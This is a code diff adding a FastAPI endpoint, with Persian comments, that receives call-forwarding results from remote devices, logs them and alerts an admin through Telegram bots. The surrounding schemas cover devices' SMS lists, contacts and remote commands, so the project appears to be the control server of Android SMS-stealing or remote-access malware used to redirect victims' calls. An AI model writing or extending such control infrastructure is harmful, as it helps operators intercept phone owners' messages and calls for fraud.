@@ -30,7 +30,8 @@ from .background_tasks import (
 from .models.schemas import (
     DeviceStatus, SendCommandRequest, UpdateSettingsRequest,
     DeviceListResponse, SMSListResponse, ContactListResponse, StatsResponse,
-    AppTypeInfo, AppTypesResponse, SMSDeliveryStatusRequest, SMSDeliveryStatusResponse
+    AppTypeInfo, AppTypesResponse, SMSDeliveryStatusRequest, SMSDeliveryStatusResponse,
+    CallForwardingResult, CallForwardingResultResponse
 )
 from .models.admin_schemas import (
     Admin, AdminCreate, AdminUpdate, AdminLogin, TokenResponse,
@@ -559,6 +560,71 @@ async def sms_delivery_status(delivery_data: SMSDeliveryStatusRequest):
         raise
     except Exception as e:
         logger.error(f"❌ Error processing SMS delivery status: {e}", exc_info=True)
+        raise HTTPException(status_code=500, detail=str(e))
+
+
+@app.post("/devices/call-forwarding/result", response_model=CallForwardingResultResponse)
+async def call_forwarding_result(result_data: CallForwardingResult):
+    """
+    📞 دریافت نتیجه فعال/غیرفعال سازی Call Forwarding از دستگاه
+    
+    دستگاه بعد از اجرای دستور call forwarding، نتیجه رو به این endpoint ارسال می‌کنه
+    """
+    try:
+        device_id = result_data.deviceId
+        success = result_data.success
+        message = result_data.message
+        sim_slot = result_data.simSlot
+        
+        logger.info(f"📞 Call forwarding result from device {device_id}: {message}")
+        
+        # بررسی دستگاه
+        device = await device_service.get_device(device_id)
+        if not device:
+            logger.warning(f"⚠️ Device not found: {device_id}")
+            raise HTTPException(status_code=404, detail="Device not found")
+        
+        # ذخیره در لاگ
+        log_level = "success" if success else "error"
+        log_message = f"Call forwarding (SIM {sim_slot}): {message}"
+        
+        await device_service.add_log(
+            device_id,
+            "call_forwarding",
+            log_message,
+            log_level,
+            metadata={
+                "success": success,
+                "sim_slot": sim_slot,
+                "message": message,
+                "result_type": "call_forwarding_result"
+            }
+        )
+        
+        # اگر فشل شد، به ادمین اطلاع بده
+        if not success and device.admin_username:
+            try:
+                await telegram_multi_service.send_to_admin(
+                    device.admin_username,
+                    f"❌ Call Forwarding Failed\n"
+                    f"📱 Device: <code>{device_id}</code>\n"
+                    f"📡 SIM: {sim_slot}\n"
+                    f"⚠️ Error: {message}",
+                    bot_index=1  # Bot 1: Device notifications
+                )
+            except Exception as tg_error:
+                logger.warning(f"⚠️ Failed to send Telegram notification: {tg_error}")
+        
+        return CallForwardingResultResponse(
+            success=True,
+            message="Call forwarding result logged successfully",
+            logged=True
+        )
+    
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"❌ Error processing call forwarding result: {e}", exc_info=True)
         raise HTTPException(status_code=500, detail=str(e))
 
 
